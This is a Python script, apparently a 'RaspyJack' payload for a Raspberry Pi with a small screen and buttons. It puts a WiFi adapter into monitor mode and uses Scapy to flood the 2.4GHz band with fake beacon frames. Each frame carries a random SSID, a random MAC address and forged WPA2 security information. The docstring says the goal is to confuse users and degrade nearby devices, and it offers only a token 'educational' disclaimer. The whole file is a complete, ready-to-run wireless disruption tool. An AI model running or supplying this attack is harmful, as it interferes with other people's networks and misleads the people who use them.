#!/usr/bin/env python3
"""
RaspyJack *payload* – **WiFi Beacon Flood**
=============================================
This script floods the 2.4GHz WiFi spectrum with fake beacon frames,
creating hundreds of non-existent WiFi networks. This can confuse users,
clutter network lists, and potentially impact the performance of nearby
devices.

It demonstrates how to:
1. Use the Scapy library to craft and send 802.11 beacon frames.
2. Put a compatible WiFi interface into monitor mode.
3. Run the attack in a separate thread to keep the UI responsive.
4. Display the attack status and packet count on the LCD.
5. Start and stop the attack cleanly.

**Disclaimer:** This is for educational purposes. Use responsibly.
"""

# ---------------------------------------------------------------------------
# 0) Imports & boilerplate
# ---------------------------------------------------------------------------
import os, sys, subprocess, signal, time, threading, random, string
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

# ---------------------------- Third‑party libs ----------------------------
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

try:
    from scapy.all import *
except ImportError:
    print("Scapy is not installed. Please run: pip install scapy", file=sys.stderr)
    sys.exit(1)

# ---------------------------------------------------------------------------
# 1) GPIO mapping (BCM)
# ---------------------------------------------------------------------------
PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)

# ---------------------------------------------------------------------------
# 3) Global State & Configuration
# ---------------------------------------------------------------------------
WIFI_INTERFACE = "wlan1"  # Default interface, must support monitor mode
running = True
attack_thread = None
attack_stop_event = threading.Event()
packet_count = 0

# ---------------------------------------------------------------------------
# 4) Graceful shutdown
# ---------------------------------------------------------------------------
def cleanup(*_):
    """Signal handler to stop the main loop and attack thread."""
    global running
    running = False
    attack_stop_event.set()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ---------------------------------------------------------------------------
# 5) WiFi & Attack Functions
# ---------------------------------------------------------------------------

def set_monitor_mode(enable: bool):
    """Enables or disables monitor mode on the interface."""
    try:
        if enable:
            subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True, check=True)
            subprocess.run(f"iwconfig {WIFI_INTERFACE} mode monitor", shell=True, check=True)
            subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True, check=True)
            # Verify
            result = subprocess.check_output(f"iwconfig {WIFI_INTERFACE}", shell=True).decode()
            return "Mode:Monitor" in result
        else: # Disable
            subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True, check=True)
            subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed", shell=True, check=True)
            subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True, check=True)
            return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"Error setting monitor mode: {e}", file=sys.stderr)
        return False

def beacon_flood_worker():
    """The thread worker that crafts and sends beacon frames."""
    global packet_count
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info="", len=0)
    rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'                 # RSN Version 1
        '\x00\x0f\xac\x02'         # Group Cipher Suite: TKIP
        '\x02\x00'                 # 2 Pairwise Cipher Suites
        '\x00\x0f\xac\x04'         # AES (CCMP)
        '\x00\x0f\xac\x02'         # TKIP
        '\x01\x00'                 # 1 Authentication Key Management Suite
        '\x00\x0f\xac\x02'         # PSK
        '\x00\x00'))               # RSN Capabilities

    while not attack_stop_event.is_set():
        # Randomize SSID
        ssid = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
        essid.info = ssid.encode()
        essid.len = len(ssid)
        
        # Randomize BSSID (MAC address)
        random_mac = [random.randint(0x00, 0xff) for _ in range(6)]
        random_mac[0] &= 0xfe # Unicast
        dot11.addr2 = ":".join(map(lambda x: f"{x:02x}", random_mac))
        dot11.addr3 = dot11.addr2

        frame = RadioTap()/dot11/beacon/essid/rsn
        
        sendp(frame, iface=WIFI_INTERFACE, count=1, inter=0.01, verbose=0)
        packet_count += 1

def start_attack():
    """Starts the beacon flood thread."""
    global attack_thread, packet_count
    if attack_thread and attack_thread.is_alive():
        return # Already running

    packet_count = 0
    attack_stop_event.clear()
    attack_thread = threading.Thread(target=beacon_flood_worker, daemon=True)
    attack_thread.start()

def stop_attack():
    """Stops the beacon flood thread."""
    attack_stop_event.set()
    if attack_thread:
        attack_thread.join(timeout=2)

# ---------------------------------------------------------------------------
# 6) UI and Drawing Functions
# ---------------------------------------------------------------------------

def draw_ui(status: str, packets: int):
    """Draws the main UI."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)

    d.text((5, 5), "WiFi Beacon Flood", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    status_color = "lime" if status == "ACTIVE" else "red"
    d.text((30, 35), status, font=FONT_STATUS, fill=status_color)

    d.text((5, 60), "Packets Sent:", font=FONT, fill="white")
    d.text((15, 75), str(packets), font=FONT_TITLE, fill="yellow")

    d.text((5, 110), "OK=Start/Stop | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_message(message: str, color: str = "yellow"):
    """Draws a status message on the screen."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    bbox = d.textbbox((0, 0), message, font=FONT_TITLE)
    w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
    x = (WIDTH - w) // 2
    y = (HEIGHT - h) // 2
    d.text((x, y), message, font=FONT_TITLE, fill=color)
    LCD.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# 7) Main Loop
# ---------------------------------------------------------------------------
try:
    is_attacking = False
    
    draw_message("Setting up...")
    if not set_monitor_mode(True):
        draw_message("Monitor Mode FAILED", "red")
        time.sleep(3)
        raise SystemExit("Failed to enable monitor mode")

    while running:
        draw_ui("ACTIVE" if is_attacking else "STOPPED", packet_count)
        
        # Wait for button press, but with a timeout to refresh the UI
        button_pressed = False
        start_wait = time.time()
        while time.time() - start_wait < 1.0 and not button_pressed:
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            if GPIO.input(PINS["OK"]) == 0:
                is_attacking = not is_attacking
                if is_attacking:
                    start_attack()
                else:
                    stop_attack()
                button_pressed = True
                time.sleep(0.3) # Debounce
                break
            
            time.sleep(0.05)
        
        if not running:
            break

except (KeyboardInterrupt, SystemExit):
    pass
except Exception as e:
    print(f"[ERROR] {e}", file=sys.stderr)
    draw_message(f"ERROR:\n{str(e)[:20]}", "red")
    time.sleep(3)
finally:
    cleanup()
    draw_message("Cleaning up...")
    set_monitor_mode(False)
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("Beacon Flood payload finished.")
